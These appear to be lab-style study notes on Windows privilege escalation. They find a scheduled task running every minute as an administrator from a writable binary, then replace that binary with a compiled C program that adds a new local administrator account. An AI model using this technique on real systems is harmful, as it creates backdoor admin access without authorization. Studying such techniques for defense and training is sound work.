# Scheduled Tasks

In this example we discover a scheduled task with the author being a member of `Administrators`, yet we have full access to the related binary

```powershell
schtasks /query /fo LIST /v
```

```
...
Folder: \Microsoft
HostName:                             CLIENTWK220
TaskName:                             \Microsoft\CacheCleanup
Next Run Time:                        7/11/2022 2:47:21 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/11/2022 2:46:22 AM
Last Result:                          0
Author:                               CLIENTWK220\daveadmin
Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In:                             C:\Users\steve\Pictures
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          daveadmin
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           7:37:21 AM
Start Date:                           7/4/2022
...
```

In the output, we are specifically looking at the rows

- `TaskName`
- `Next Run Time`
- `Task To Run`
- `Run As User`

We can gather from the output that the program is running every minute, and executing as `daveadmin`, who is a member of `Administrators`.

We can also check the permissions of the `Task To Run` binary and discover we have full permissions to the binary

```powershell
icacls "C:\Users\steve\Pictures\BackendCacheCleanup.exe"
```

To exploit this, we can simply use the following `adduser.c` program

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user mojo password123! /add");
  i = system ("net localgroup administrators mojo /add");
  
  return 0;
}
```

Compilation

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

Now after moving `adduser.exe` onto the target, we will make a backup of the original task just in case, before replacing it

```powershell
mv Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
mv BackEndCacheCleanup.exe Pictures
```

Then after a minute we can check and see that our new user has been created

```powershell
Get-LocalUser
# mojo is visible
Get-LocalGroupMember Administrators
# mojo is visible
```
